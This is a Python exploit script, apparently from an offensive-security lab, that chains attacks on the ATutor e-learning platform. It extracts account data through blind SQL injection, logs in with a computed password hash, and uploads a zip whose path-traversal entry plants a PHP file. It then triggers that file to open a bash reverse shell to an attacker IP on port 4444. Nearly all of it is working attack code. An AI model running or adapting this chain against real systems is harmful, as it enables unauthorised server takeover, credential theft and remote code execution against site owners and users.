import requests
import sys
import hashlib
import colorama
from colorama import Fore, Style
import zipfile
from cStringIO import StringIO

banner= '''
 ___  ___  _    _  ___  ___       _            
/ __>| . || |  <_>| . ||_ _|_ _ _| |_ ___  _ _ 
\__ \| | || |_ | ||   | | || | | | | / . \| '_>
<___/`___\|___||_||_|_| |_|`___| |_| \___/|_|  
+lodwad                                                  
'''

#SQLi CODE START
def searchFriends_sqli(ip, inj_str):
	for j in range(32,126):
		target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
		r = requests.get(target)
		content_length = int(r.headers['Content-Length'])
		if (content_length > 20):
			return j
	return None

def inject(r, inj, ip):
	extracted = ""
	for i in range(1, r):
		injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
		retrieved_value = searchFriends_sqli(ip, injection_string)
		if(retrieved_value):
			extracted += chr(retrieved_value)
			extracted_char = chr(retrieved_value)
			sys.stdout.write(extracted_char)
			sys.stdout.flush()
		else:	
			print (Fore.CYAN + "\n(+) done!")
			break
	return extracted 
#SQLi CODE END

#LOGIN CODE START
def gen_hash(passwd, date):
	m=hashlib.sha512()
	m=hashlib.sha512(passwd + (hashlib.sha512(date).hexdigest()))
	print m.hexdigest()
	return m.hexdigest()

def we_can_login_with_a_hash(password, ip, last_login):
	print (Fore.YELLOW + "Attempting to log into the Atutor Server \n")
	proxies = {"http" : "http://127.0.0.1:8080"}
	target = "http://%s/ATutor/login.php" % sys.argv[1]
	token = "lodwad"
	hashed = gen_hash(password, last_login)
	c = {"ATLogin" : "teacher", "ATPass" : hashed }
	d = { "dummy" : "dummy"	}
	s = requests.Session()
	r = s.post(target, cookies=c, data=d, proxies=proxies, verify=False)
	res = r.text
	if "My Start Page" in res or "My Start Page > My Courses" in res:
		print (Fore.YELLOW + "Logged in Successfully!")
	else:
		print (Fore.RED + "Login Failed")

#build a zip file payload:
	print (Fore.YELLOW + "building a payload and packing it into a zip file")
	f = StringIO()
	z = zipfile.ZipFile(f, 'w' , zipfile.ZIP_DEFLATED)
	z.writestr('../../../../../var/www/html/ATutor/mods/poc/poc.phtml' , '<?php exec(\'/bin/bash -c \"bash -i >& /dev/tcp/192.168.119.121/4444 0>&1\"\'); ?>')
	z.writestr('imsmanifest.xml' , 'invalid xml')
	z.close()
	zip = open('poc.zip' , 'wb')
	zip.write(f.getvalue())
	zip.close()
	print (Fore.YELLOW + "A Payload was created -.-")

#send the zip file
	print (Fore.YELLOW + "sending the payload to the ATutor system")
	#payload_target = "http://%s/ATutor/mods/_standard/tests/question_import.php?h=" % sys.argv[1]
	payload_target = "http://%s/ATutor/mods/_standard/tests/import_test.php?h=" % sys.argv[1]
	file = [
		('file' , ('poc.zip', open("poc.zip" , "rb") , 'application/zip')), 
		('submit_import' , (None, 'Import'))
		]
	r = s.post(payload_target,proxies=proxies, verify=False, files=file)
	res2 = r.text
	if "XML error:" in res2 or "Not well-formed (invalid token) at line 1" in res2:
		print (Fore.YELLOW + "Uploaded Payload! \n" + "Generating your shell")
	else:
		print (Fore.RED + "whoops! something broke!")

#spawn the reverse shell
def _callShell():
	print (Fore.YELLOW + "spawning your reverse shell")
	shell_target = "http://%s/ATutor/mods/poc/poc.phtml" % sys.argv[1]
	proxies = {"http" : "http://127.0.0.1:8080"}
	r = requests.get(shell_target, proxies=proxies, verify=False)
#LOGIN CODE END

def main():
	if len(sys.argv) != 4:
		print "(+) useage: %s <target> <attacker> <listening port> " % sys.argv[0]
		print '(+) eg: %s 192.168.1.100 127.0.0.1 4444' % sys.argv[0]
		sys.exit(-1)
	print (Fore.LIGHTMAGENTA_EX + banner + "\n")
	ip = sys.argv[1]
	attacker = sys.argv[2]
	port = sys.argv[3]

	print attacker , port 

	#print (Fore.BLUE + "(+) Retrieving username....")
	#query = 'select/**/login/**/from/**/AT_members/**/where/**/status=3/**/limit/**/1' 
	#username = inject(50, query, ip)
	username = "teacher"

	#print "(+) Retrieving password hash...."
	#query = 'select/**/password/**/from/**/AT_members/**/where/**/login/**/=/**/\'%s\'' % (username)
	#password = inject(50, query, ip)
	#print (Fore.RED +"(+) Credentials: %s / %s" % (username, password) )
	password = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"

	print (Fore.WHITE + "(+) Retrieving last_login....")
	query = 'select/**/last_login/**/from/**/AT_members/**/where/**/login/**/=/**/\'%s\'' % (username)
	last_login = inject(50, query, ip)
	

	print "(+) Credentials: %s / %s / %s" % (username, password, last_login)

	we_can_login_with_a_hash(password, ip, last_login)
	_callShell()

	

#upload a zip file that contains the php files to web root
#get code execution

if __name__ == "__main__":
	main()